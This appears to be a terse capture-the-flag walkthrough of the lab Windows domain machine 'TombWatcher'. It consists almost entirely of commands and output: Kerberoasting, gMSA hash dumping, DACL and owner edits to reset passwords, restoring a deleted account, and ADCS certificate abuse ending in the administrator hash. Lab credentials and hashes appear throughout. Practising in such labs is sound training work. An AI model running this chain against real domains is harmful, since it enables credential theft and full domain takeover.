10.129.232.167
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

### 1)nmap -sU --top-ports 100 10.129.232.167

Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

### 2)sudo nmap -sS -sV -p- -O 10.129.232.167

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 19:16:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
54254/tcp open  msrpc         Microsoft Windows RPC
54269/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

### 3)bloodhound-python -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -dc 'tombwatcher.htb' -ns '10.129.232.167' -c All --zip

### 4)python3 targetedKerberoast.py -d 'tombwatcher.HTB' --dc-ip '10.129.232.167' -u 'henry' -p 'H3nry_987TGV!' --request-user Alfred 

tombwatcher.HTB/Alfred:basketball
5)bloodyAD -u alfred -p basketball -d tombwatcher.htb --host 10.129.232.167 add groupMember Infrastructure alfred

### 6)kali@kali /tmp/target ❯ gMSADumper -u 'Alfred' -p 'basketball' -d 'tombwatcher.htb'  

Users or groups who can read password for ansible_dev$:

 > Infrastructure
 > ansible_dev$:::2669c6ff3a3d9c7472e358c7a792697b
 > ansible_dev$:aes256-cts-hmac-sha1-96:3cdbffeefea8bb3e2619566eb888fdb1dd5bcf1c7b8b0962be11fb39750b135d
 > ansible_dev$:aes128-cts-hmac-sha1-96:79a0b60efc9089900b73384d954778f0
 >
 > ### 7)kali@kali /tmp/target ❯ bloodyAD -u 'ansible_dev$'  -p ':2669c6ff3a3d9c7472e358c7a792697b' -f rc4 -d tombwatcher.htb --host 10.129.232.167 set password 'sam' 'aA12345677..'
 >
 > [+] Password changed successfully!

### 8)impacket-owneredit 'tombwatcher.htb/sam:aA12345677..' -target john -action write -new-owner-sid 'S-1-5-21-1392491010-1358638721-2126982587-1105'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!

### 9)impacket-dacledit 'tombwatcher.htb/sam:aA12345677..'  -dc-ip '10.129.232.167' -principal sam -target john -rights ResetPassword -action write                  

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260103-005050.bak
[*] DACL modified successfully!

### 10)net rpc user password -S '10.129.232.167' -I '10.129.232.167' -U 'tombwatcher.htb/sam%aA12345677..' 'john' 'aA12345677..' 

### 11)impacket-dacledit 'tombwatcher.htb/john:aA12345677..' -dc-ip '10.129.232.167' -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' -inheritance -rights FullControl -action write

### 12)Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
Enable-ADAccount -Identity cert_admin
Set-ADAccountPassword -Identity cert_admin -NewPassword (ConvertTo-SecureString "aA12345677.." -AsPlainText -Force)
certipy-ad req -ns '10.129.232.167' -dc-ip '10.129.232.167' -u 'cert_admin' -p 'aA12345677..' -template 'WebServer' -ca 'tombwatcher-CA-1' -application-policies 'Certificate Request Agent'
certipy-ad req -ns '10.129.232.167' -dc-ip '10.129.232.167' -u 'cert_admin' -p 'aA12345677..' -template 'user' -ca 'tombwatcher-CA-1' -on-behalf-of 'tombwatcher\administrator' -pfx 'cert_admin.pfx'
certipy-ad auth -ns 10.129.232.167 -dc-ip 10.129.232.167 -domain 'tombwatcher.htb' -pfx 'administrator.pfx'
Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc

